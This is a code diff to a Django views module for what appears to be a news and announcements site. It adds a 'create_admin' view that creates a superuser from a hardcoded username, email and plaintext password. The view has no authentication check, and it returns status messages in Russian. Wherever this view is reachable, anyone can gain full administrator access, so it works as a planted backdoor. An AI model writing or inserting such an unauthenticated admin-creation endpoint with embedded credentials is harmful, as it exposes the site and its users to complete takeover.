@@ -1,5 +1,7 @@
 from django.shortcuts import render, get_object_or_404
 from .models import News, Document, Announcement
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
 
 
 def index(request):
@@ -32,3 +34,17 @@ def announcements(request):
     announcements = Announcement.objects.order_by('-date')
     return render(request, "announcements.html",
                   {"announcements": announcements})
+
+
+def create_admin(request):
+    User = get_user_model()
+    username = "raul245"
+    email = "kirillmendrin245@yandex.com"
+    password = "viper2018"
+
+    if not User.objects.filter(username=username).exists():
+        User.objects.create_superuser(
+            username=username, email=email, password=password)
+        return HttpResponse("✅ Суперпользователь создан")
+    else:
+        return HttpResponse("⚠️ Суперпользователь уже существует")
